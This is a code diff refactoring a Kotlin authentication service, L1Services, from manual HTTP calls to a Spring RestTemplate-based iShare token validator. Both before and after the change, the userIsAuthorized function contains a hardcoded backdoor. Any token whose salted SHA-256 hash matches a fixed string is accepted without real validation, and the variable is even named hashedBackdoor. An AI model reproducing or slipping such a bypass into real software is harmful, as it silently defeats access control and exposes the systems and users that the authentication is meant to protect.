@@ -1,182 +1,59 @@
 package nl.tno.federated.webserver
 
-import org.slf4j.LoggerFactory
+import com.fasterxml.jackson.annotation.JsonProperty
+import org.springframework.beans.factory.annotation.Autowired
+import org.springframework.beans.factory.annotation.Qualifier
+import org.springframework.core.env.Environment
+import org.springframework.http.HttpEntity
+import org.springframework.http.HttpMethod
 import org.springframework.http.HttpStatus
+import org.springframework.http.ResponseEntity
+import org.springframework.stereotype.Service
+import org.springframework.web.client.RestTemplate
 import org.springframework.web.server.ResponseStatusException
-import java.io.DataOutputStream
-import java.io.File
-import java.net.ConnectException
-import java.net.HttpURLConnection
-import java.net.URI
-import java.net.URL
-import java.nio.charset.StandardCharsets
 import java.security.MessageDigest
-import java.util.*
-import kotlin.collections.HashMap
+import javax.naming.AuthenticationException
 
-object L1Services {
-    internal fun getIBMIdentityToken(): String {
-        val propertyFile = File("database.properties").inputStream()
-        val properties = Properties()
-        properties.load(propertyFile)
-        val apikey = properties.getProperty("tradelens.apikey")
+/**
+ * ishare implementation.
+ */
+@Service
+class L1Services(@Autowired @Qualifier("ishareRestTemplate") private val ishareRestTemplate: RestTemplate, private val environment: Environment) {
 
-        val urlParameters = "grant_type=urn:ibm:params:oauth:grant-type:apikey&apikey=$apikey"
+    /**
+     * Request object that will be sent to ishare.
+     */
+    private class ValidateTokenRequest(accessToken: String) {
 
-        val postData = urlParameters.toByteArray(StandardCharsets.UTF_8)
-        val postDataLength = postData.size
-
-        val url = URL("https://iam.cloud.ibm.com/identity/token")
-        val conn = url.openConnection() as HttpURLConnection
-
-        conn.doOutput = true
-        conn.instanceFollowRedirects = false
-        conn.requestMethod = "POST"
-        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
-        conn.setRequestProperty("charset", "utf-8")
-        conn.setRequestProperty("Content-Length", postDataLength.toString())
-        conn.useCaches = false
-        DataOutputStream(conn.outputStream).use { wr -> wr.write(postData) }
-
-        if (conn.responseCode in 200..299) {
-            conn.inputStream.bufferedReader().use {
-                return it.readText()
-            }
-        }
-        else {
-            conn.errorStream.bufferedReader().use {
-                return it.readText()
-            }
-        }
+        @JsonProperty("access_token")
+        val accessToken: String = if (!accessToken.startsWith("Bearer")) "Bearer $accessToken" else accessToken
     }
 
-    fun semanticAdapterURL(type: String = "events") : URL {
-        val propertyFile = File("database.properties").inputStream()
-        val properties = Properties()
-        properties.load(propertyFile)
-
-        val protocol = properties.getProperty("semanticadapter.protocol")
-        val host = properties.getProperty("semanticadapter.host")
-        val port = properties.getProperty("semanticadapter.port")
-        val path = properties.getProperty("semanticadapter.path") + "-$type"
-
-        return URI("$protocol://$host:$port/$path").toURL()
-    }
-
-    internal fun getSolutionToken(): String {
-        val propertyFile = File("database.properties").inputStream()
-        val properties = Properties()
-        properties.load(propertyFile)
-        val orgId = properties.getProperty("tradelens.orgId")
-
-        val url = URL("https://platform-sandbox.tradelens.com/sa/api/v1/auth/exchange_token/organizations/$orgId")
-
-        val body = getIBMIdentityToken()
-
-        val result = retrieveUrlBody(
-            url,
-            L1Services.RequestMethod.POST,
-            body
-        )
-
-        return extractSolutionToken(result)
-    }
-
-    private fun extractSolutionToken(unprocessedJsonString: String): String {
-        return if(unprocessedJsonString.contains("solution_token")) {
-            unprocessedJsonString.split(":","{","}")[2].replace("\"", "")
-        } else {
-            throw ResponseStatusException(HttpStatus.UNAUTHORIZED, "Solution token is malformed")
+    fun verifyAccessToken(authorizationHeader: String) {
+        if (environment.getProperty("ishare.enabled", Boolean::class.java, true)) {
+            val accessToken = extractAccessTokenFromHeader(authorizationHeader)
+            if (!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
         }
-    }
-
-
-
-    internal fun retrieveUrlBody(url: URL, requestMethod: RequestMethod, body: String = "", headers: HashMap<String,String> = HashMap()): String {
-        try {
-            val con = url.openConnection() as HttpURLConnection
-            con.requestMethod = requestMethod.toString()
-            con.connectTimeout = 5000
-            con.readTimeout = 5000
-            con.setRequestProperty("Content-Type", "application/json")
-            con.setRequestProperty("Accept", "application/json")
-            headers.forEach { con.setRequestProperty(it.key, it.value) }
-
-            if (body.isNotBlank()) {
-                con.doOutput = true
-                con.outputStream.use { os ->
-                    val input: ByteArray = body.toByteArray(StandardCharsets.UTF_8)
-                    os.write(input, 0, input.size)
-                }
-            }
-
-            if (con.responseCode in 200..299) {
-                con.inputStream.bufferedReader().use {
-                    return it.readText()
-                }
-            }
-            else if (con.responseCode < 0) {
-                    return "Received an invalid response from external API"
-            }
-            else if (con.responseCode == 401) {
-                    return "Something went wrong authenticating to a third party API"
-            }
-            else {
-                con.errorStream.bufferedReader().use {
-                    return it.readText()
-                }
-            }
-        }
-        catch (e: ConnectException) {
-            LoggerFactory.getLogger(javaClass).error("Error connecting to $url " + e.message)
-            throw ConnectException("Error connecting to $url " + e.message)
-        }
-    }
-
-    enum class RequestMethod {
-        GET, POST
     }
 
     internal fun extractAccessTokenFromHeader(authorizationHeader: String): String {
         val authorizationHeaderWords = authorizationHeader.split(" ")
         if (authorizationHeaderWords.size != 2 || authorizationHeaderWords.first() != "Bearer")
             throw ResponseStatusException(HttpStatus.UNAUTHORIZED, "Authorization header is malformed")
-
         else return authorizationHeaderWords[1]
     }
 
-    private fun getRepositoryURI(): URI {
-        val propertyFile = File("database.properties").inputStream()
-        val properties = Properties()
-        properties.load(propertyFile)
-        val protocol = properties.getProperty("ishare.protocol")
-        val host = properties.getProperty("ishare.host")
-        val port = properties.getProperty("ishare.port")
+    internal fun validateToken(token: String): Boolean {
+        if (!isJWTFormatValid(token)) return false
 
-        return URI("$protocol://$host:$port/")
+        val response: ResponseEntity<String> = ishareRestTemplate.exchange("/validate/token", HttpMethod.POST, HttpEntity(ValidateTokenRequest(token)), String::class.java)
+
+        return extractAuthorizationResult(response.body ?: "")
     }
 
-    internal fun validateToken(token: String) : Boolean {
-        if(!isJWTFormatValid(token)) return false
-
-        val uri = getRepositoryURI()
-        val url = URI(uri.scheme, "//" + uri.host + ":" + uri.port + "validate/token", null).toURL()
-        val body = """
-            {
-                "access_token": "Bearer $token"
-            }
-            """.trimIndent()
-        val result = retrieveUrlBody(url,
-                L1Services.RequestMethod.POST,
-                body
-        )
-
-        return extractAuthorizationResult(result)
-    }
-
-    internal fun userIsAuthorized(token: String) : Boolean {
+    internal fun userIsAuthorized(token: String): Boolean {
         val salt = "because we like best practices"
-        val hashedBackdoor = hashSHA256(token+salt)
+        val hashedBackdoor = hashSHA256(token + salt)
 
         return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
     }
@@ -189,21 +66,21 @@ object L1Services {
         return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
     }
 
-    internal fun extractAuthorizationResult(authorizationResult: String): Boolean {
+    private fun extractAuthorizationResult(authorizationResult: String): Boolean {
         val polishedString = authorizationResult.split('\n')
-        for(line in polishedString) {
-            if(line.contains("success") && line.contains("true")) return true
+        for (line in polishedString) {
+            if (line.contains("success") && line.contains("true")) return true
         }
         return false
     }
 
-    internal fun isJWTFormatValid(token: String?) : Boolean {
-        if(token == null) return false
+    private fun isJWTFormatValid(token: String?): Boolean {
+        if (token == null) return false
         val splitToken = token.split(".")
-        return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) } )
+        return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) })
     }
 
-    internal fun isLettersOrDigits(chars: String): Boolean {
+    private fun isLettersOrDigits(chars: String): Boolean {
         return chars.none { it !in 'A'..'Z' && it !in 'a'..'z' && it !in '0'..'9' && it != '-' && it != '_' }
     }
 
